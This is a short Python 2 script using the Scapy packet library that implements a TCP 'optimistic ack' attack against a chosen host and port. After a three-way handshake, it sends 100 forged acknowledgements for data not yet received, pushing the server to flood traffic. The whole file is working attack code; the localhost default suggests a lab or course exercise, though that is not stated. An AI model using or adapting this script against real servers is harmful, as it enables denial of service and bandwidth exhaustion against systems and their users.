#!/usr/bin/env python
"""
This file implements the Optimal Ack attacker.
"""

import argparse
import time
from scapy.all import *

parser = argparse.ArgumentParser(
    description='Attack a TCP server with the optimistic ack attack.')
parser.add_argument('--dport', default=8000, type=int,
                    help='The port to attack.')
parser.add_argument('--sport', default=8080, type=int,
                    help='The port to send the TCP packets from.')
parser.add_argument('--host', default='127.0.0.1', type=str,
                    help='The ip address to attack.')
args = parser.parse_args()

if __name__ == "__main__":
    print "Starting three-way handshake..."
    ip_header = IP(dst=args.host)
    SEQ=12345

    syn = ip_header / TCP(sport=args.sport, dport=args.dport, flags='S', seq=SEQ)
    synack = sr1(syn)
    ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=synack.seq + 1, seq=(SEQ + 1))
    data = sr1(ack)

    print "First data packet arrived. Sending optimistic acks."
    data.show()

    OPT_ACK_START = data.seq + 1
    ACK_SPACING = 1000
    pkt_list = []
    for i in range(100):
        opt_ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * ACK_SPACING), seq=(SEQ + 1))
        pkt_list.append(opt_ack)
    
    send(pkt_list)

